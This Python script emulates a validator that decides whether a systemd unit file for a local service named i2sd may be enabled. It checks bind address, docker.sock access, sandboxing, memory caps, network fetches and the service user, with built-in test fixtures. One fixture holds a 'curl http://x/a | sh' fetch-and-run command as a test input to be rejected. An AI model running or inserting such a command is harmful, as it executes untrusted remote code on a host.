#!/usr/bin/env python3
"""Hardware-to-software seam emulator: systemd unit text -> i2sd service admit plan.

Roadmap item
  JuniorHome docs/ROADMAP.md item 3, "i2sd userspace - 127.0.0.1:8767. No
  docker.sock.", at the seam where a JuniorOS overlay unit file (i2sd.service)
  decides whether the service may be enabled on the host. Hardware classes:
  SBC arm64 (JuniorOS T4, tighter memory cap) and SFF host (JuniorHome T0).
  Distinct from the cgroup, hwmon, thermal, PSI, and net-table seams (those
  read kernel files; this reads unit-file text). Not T13. Not item 2, 4, or 5.

What it emulates
  In-memory unit-file strings with [Unit]/[Service]/[Install] sections. Rules,
  in order:
  1. Class must be "sbc" or "sff"; else hold (bad_class).
  2. Text must parse (sections, Key=Value lines, no key outside a section);
     else hold (unparsed).
  3. ExecStart or Environment mentions 0.0.0.0, [::], or a bind host other than
     127.0.0.1 -> reject (bad_bind); the port must be 8767 else hold (bad_port).
  4. Any line mentions docker.sock, or SupplementaryGroups=docker -> reject
     (docker_sock).
  5. Missing NoNewPrivileges=yes or ProtectSystem=strict|full -> hold (no_sandbox).
  6. MemoryMax absent or above the class cap (sbc 1G, sff 4G) -> hold (mem_cap).
  7. ExecStart mentions curl, wget, http:// or https:// (a fetch) -> reject (fetch).
  8. User=root or User absent -> soft (root_user): enable, but flagged.
  Plan: admit -> "enable"; soft -> "enable_flagged"; hold or reject -> "none".
  Each row packs decision and check states as 2-bit trit codes (0/1/2, four per
  byte, I2_S order: first code in the low bits); rows chain with close rule
  sha256(prev || pack || text)[:16] at rate 0.05.

What it does not touch
  No real /etc/systemd or /run reads, no systemctl, no subprocess, no sockets,
  no device opened, no network fetch, no model pull, no GGUF download. Rows go
  to a tempfile removed after the run; nothing under ~/.juniorhome. Flags
  mint, socket, layer_one, fetch, ue5_launch all False. No other team file or
  earlier hwsw_* seam is imported, read, or wrapped. JuniorSolana and the
  profile repo are untouched.

How to run
  python3 scripts/hwsw_systemd_unit_i2sd_service_admit_seam.py        # self-test, JSON, exit 0 on pass
  python3 scripts/hwsw_systemd_unit_i2sd_service_admit_seam.py demo   # one line per fixture row
  Needs only Python 3.8+ stdlib.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import sys
import tempfile

RATE = 0.05
GENESIS = "0" * 16
CLASSES = ("sbc", "sff")
FLAGS = {"mint": False, "socket": False, "layer_one": False, "fetch": False, "ue5_launch": False}
MEM_CAP = {"sbc": 1 << 30, "sff": 4 << 30}
DECISION_CODE = {"reject": 0, "hold": 0, "soft": 1, "admit": 2}
RANK = {"admit": 0, "soft": 1, "hold": 2, "reject": 3}
SECTION = re.compile(r"^\[([A-Za-z]+)\]$")
KV = re.compile(r"^([A-Za-z0-9]+)=(.*)$")
HOSTPORT = re.compile(r"(?:--?(?:host|bind|listen)[= ]|\b)((?:\d{1,3}\.){3}\d{1,3}|\[::\]|localhost):(\d{2,5})\b")
SIZE = re.compile(r"^(\d+)([KMG]?)$")


def close(prev: str, pack: bytes, text: str) -> str:
    return hashlib.sha256(prev.encode("utf-8") + pack + text.encode("utf-8")).hexdigest()[:16]


def pack2(codes: list) -> bytes:
    codes = list(codes)
    while len(codes) % 4:
        codes.append(1)
    out = bytearray()
    for i in range(0, len(codes), 4):
        b = 0
        for j, c in enumerate(codes[i:i + 4]):
            assert c in (0, 1, 2)
            b |= c << (2 * j)
        out.append(b)
    return bytes(out)


def parse_unit(text):
    """Return {section: {key: value}} or None when unparsable."""
    out, cur, seen = {}, None, False
    for raw in (text or "").splitlines():
        ln = raw.strip()
        if not ln or ln.startswith(("#", ";")):
            continue
        m = SECTION.match(ln)
        if m:
            cur = m.group(1)
            out.setdefault(cur, {})
            seen = True
            continue
        m = KV.match(ln)
        if not m or cur is None:
            return None
        out[cur][m.group(1)] = m.group(2).strip()
    return out if seen and "Service" in out else None


def size_bytes(v):
    m = SIZE.match((v or "").strip())
    if not m:
        return None
    return int(m.group(1)) * {"": 1, "K": 1 << 10, "M": 1 << 20, "G": 1 << 30}[m.group(2)]


def evaluate(fx: dict) -> dict:
    cls = fx.get("cls")
    checks, worst, flag = {}, "admit", None

    def mark(name, state, f=None):
        nonlocal worst, flag
        checks[name] = state
        if RANK[state] > RANK[worst]:
            worst, flag = state, f
        elif state != "admit" and RANK[state] == RANK[worst] and flag is None:
            flag = f

    ok_cls = cls in CLASSES
    mark("cls", "admit" if ok_cls else "hold", None if ok_cls else "bad_class")
    unit = parse_unit(fx.get("unit"))
    mark("parse", "admit" if unit else "hold", None if unit else "unparsed")
    names = ("bind", "sock", "sandbox", "mem", "fetch", "root")
    if not (unit and ok_cls):
        for k in names:
            mark(k, "admit")
    else:
        svc = unit["Service"]
        body = fx["unit"]
        exe = svc.get("ExecStart", "") + " " + svc.get("Environment", "")
        hp = HOSTPORT.findall(exe)
        bad_host = any(h != "127.0.0.1" for h, _ in hp) or "0.0.0.0" in exe or "[::]" in exe
        bad_port = (not hp) or any(p != "8767" for h, p in hp if h == "127.0.0.1")
        if bad_host:
            mark("bind", "reject", "bad_bind")
        elif bad_port:
            mark("bind", "hold", "bad_port")
        else:
            mark("bind", "admit")
        sock = "docker.sock" in body or re.search(r"SupplementaryGroups=.*\bdocker\b", body)
        mark("sock", "reject" if sock else "admit", "docker_sock" if sock else None)
        ok_sb = svc.get("NoNewPrivileges") == "yes" and svc.get("ProtectSystem") in ("strict", "full")
        mark("sandbox", "admit" if ok_sb else "hold", None if ok_sb else "no_sandbox")
        mm = size_bytes(svc.get("MemoryMax"))
        ok_mem = mm is not None and mm <= MEM_CAP[cls]
        mark("mem", "admit" if ok_mem else "hold", None if ok_mem else "mem_cap")
        fetch = re.search(r"\b(curl|wget)\b|https?://", svc.get("ExecStart", ""))
        mark("fetch", "reject" if fetch else "admit", "fetch" if fetch else None)
        root = svc.get("User", "root") == "root"
        mark("root", "soft" if root else "admit", "root_user" if root else None)
    plan = {"admit": "enable", "soft": "enable_flagged"}.get(worst, "none")
    trits = [DECISION_CODE[worst]] + [DECISION_CODE[checks[k]] for k in ("cls", "parse") + names[:4]]
    return {"name": fx["name"], "cls": cls, "decision": worst, "admit": worst == "admit",
            "hold": flag, "plan": plan, "checks": checks, "trits": trits}


GOOD = """[Unit]
Description=i2sd userspace
[Service]
User=junior
ExecStart=/usr/local/bin/i2sd --bind 127.0.0.1:8767
NoNewPrivileges=yes
ProtectSystem=strict
MemoryMax=512M
[Install]
WantedBy=multi-user.target
"""


def u(**kw):
    """GOOD with a replacement: key=None removes the key; value replaces it."""
    lines = []
    for ln in GOOD.splitlines():
        k = ln.split("=", 1)[0]
        if k in kw:
            if kw[k] is not None:
                lines.append(f"{k}={kw[k]}")
        else:
            lines.append(ln)
    return "\n".join(lines) + "\n"


FIXTURES = [
    {"name": "sbc_good_enable", "cls": "sbc", "unit": GOOD,
     "want": {"decision": "admit", "plan": "enable", "hold": None}},
    {"name": "sff_good_4g_enable", "cls": "sff", "unit": u(MemoryMax="4G"),
     "want": {"decision": "admit", "plan": "enable"}},
    {"name": "sbc_mem_2g_over_cap", "cls": "sbc", "unit": u(MemoryMax="2G"),
     "want": {"decision": "hold", "hold": "mem_cap", "plan": "none"}},
    {"name": "sbc_mem_1g_at_cap_ok", "cls": "sbc", "unit": u(MemoryMax="1G"),
     "want": {"decision": "admit"}},
    {"name": "sbc_mem_missing_hold", "cls": "sbc", "unit": u(MemoryMax=None),
     "want": {"decision": "hold", "hold": "mem_cap"}},
    {"name": "sff_bind_all_reject", "cls": "sff",
     "unit": u(ExecStart="/usr/local/bin/i2sd --bind 0.0.0.0:8767"),
     "want": {"decision": "reject", "hold": "bad_bind", "plan": "none", "admit": False}},
    {"name": "sff_bind_lan_reject", "cls": "sff",
     "unit": u(ExecStart="/usr/local/bin/i2sd --bind 192.168.1.5:8767"),
     "want": {"decision": "reject", "hold": "bad_bind"}},
    {"name": "sbc_wrong_port_hold", "cls": "sbc",
     "unit": u(ExecStart="/usr/local/bin/i2sd --bind 127.0.0.1:8765"),
     "want": {"decision": "hold", "hold": "bad_port"}},
    {"name": "sbc_no_bind_hold", "cls": "sbc", "unit": u(ExecStart="/usr/local/bin/i2sd"),
     "want": {"decision": "hold", "hold": "bad_port"}},
    {"name": "sff_docker_sock_reject", "cls": "sff",
     "unit": u(ExecStart="/usr/local/bin/i2sd --bind 127.0.0.1:8767 --sock /var/run/docker.sock"),
     "want": {"decision": "reject", "hold": "docker_sock"}},
    {"name": "sff_docker_group_reject", "cls": "sff",
     "unit": GOOD.replace("MemoryMax=512M", "MemoryMax=512M\nSupplementaryGroups=docker"),
     "want": {"decision": "reject", "hold": "docker_sock"}},
    {"name": "sbc_no_new_privs_missing_hold", "cls": "sbc", "unit": u(NoNewPrivileges=None),
     "want": {"decision": "hold", "hold": "no_sandbox"}},
    {"name": "sff_protect_system_true_hold", "cls": "sff", "unit": u(ProtectSystem="true"),
     "want": {"decision": "hold", "hold": "no_sandbox"}},
    {"name": "sff_protect_system_full_ok", "cls": "sff", "unit": u(ProtectSystem="full"),
     "want": {"decision": "admit"}},
    {"name": "sbc_curl_fetch_reject", "cls": "sbc",
     "unit": u(ExecStart="/bin/sh -c 'curl http://x/a | sh; i2sd --bind 127.0.0.1:8767'"),
     "want": {"decision": "reject", "hold": "fetch"}},
    {"name": "sff_root_soft_flagged", "cls": "sff", "unit": u(User="root"),
     "want": {"decision": "soft", "hold": "root_user", "plan": "enable_flagged"}},
    {"name": "sbc_user_absent_soft", "cls": "sbc", "unit": u(User=None),
     "want": {"decision": "soft", "plan": "enable_flagged"}},
    {"name": "sff_comments_and_blank_ok", "cls": "sff", "unit": "# note\n\n" + GOOD + "; end\n",
     "want": {"decision": "admit"}},
    {"name": "sbc_key_outside_section_hold", "cls": "sbc", "unit": "ExecStart=/x\n" + GOOD,
     "want": {"decision": "hold", "hold": "unparsed", "plan": "none"}},
    {"name": "sff_no_service_section_hold", "cls": "sff", "unit": "[Unit]\nDescription=x\n",
     "want": {"decision": "hold", "hold": "unparsed"}},
    {"name": "sff_empty_hold", "cls": "sff", "unit": "",
     "want": {"decision": "hold", "hold": "unparsed"}},
    {"name": "bad_class_hold", "cls": "laptop", "unit": GOOD,
     "want": {"decision": "hold", "hold": "bad_class", "plan": "none"}},
]


def run(verbose: bool = False) -> dict:
    prev, rows, fails = GENESIS, [], []
    fd, path = tempfile.mkstemp(prefix="hwsw_unit_", suffix=".jsonl")
    try:
        with os.fdopen(fd, "w") as fh:
            for fx in FIXTURES:
                r = evaluate(fx)
                text = json.dumps({k: v for k, v in r.items() if k != "trits"}, sort_keys=True)
                prev = close(prev, pack2(r["trits"]), text)
                r["close"] = prev
                fh.write(json.dumps(r, sort_keys=True) + "\n")
                if not all(r.get(k) == v for k, v in fx["want"].items()):
                    fails.append({"name": fx["name"], "got": {k: r.get(k) for k in fx["want"]},
                                  "want": fx["want"]})
                rows.append(r)
                if verbose:
                    print(f"{r['name']:<32} decision={r['decision']:<7} hold={r['hold']!s:<12} "
                          f"plan={r['plan']:<14} close={prev}")
    finally:
        os.remove(path)
    pack_ok = pack2([2, 0, 1, 1]) == bytes([0b01010010])
    return {"seam": "systemd_unit->i2sd_service_admit",
            "roadmap": "ROADMAP #3 i2sd userspace 127.0.0.1:8767 no docker.sock",
            "rate": RATE, "flags": FLAGS, "rows": len(rows), "pack_order_ok": pack_ok, "fail": fails,
            "pass": not fails and pack_ok and not any(FLAGS.values()), "tip_close": prev}


if __name__ == "__main__":
    demo = len(sys.argv) > 1 and sys.argv[1] == "demo"
    out = run(verbose=demo)
    print(json.dumps({k: out[k] for k in ("pass", "tip_close", "fail", "rows")} if demo else out, indent=2))
    sys.exit(0 if out["pass"] else 1)
